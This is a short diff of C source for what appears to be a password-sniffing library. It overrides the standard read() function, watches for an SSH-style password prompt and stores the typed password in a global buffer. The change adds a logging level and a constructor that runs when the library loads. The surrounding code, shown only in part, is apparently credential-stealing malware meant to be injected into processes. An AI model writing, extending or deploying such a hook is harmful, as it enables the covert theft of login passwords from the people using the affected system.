@@ -8,6 +8,8 @@
 #define PASSWORD_READ_FMT "%s@%s's password: "
 #define PASSWORD_MAX_LEN 1024
 
+#define LOG_LEVEL LOG_INFO
+
 int password_read_detected = 0;
 char password[PASSWORD_MAX_LEN];
 char *cur = NULL;
@@ -50,4 +52,11 @@ ssize_t read(int __fd, void *__buf, size_t __nbytes)
         }
     }
     return result;
+}
+
+// constructor
+void __attribute__((constructor)) init(void)
+{
+    log_trace("init() called");
+    log_set_level(LOG_LEVEL);
 }
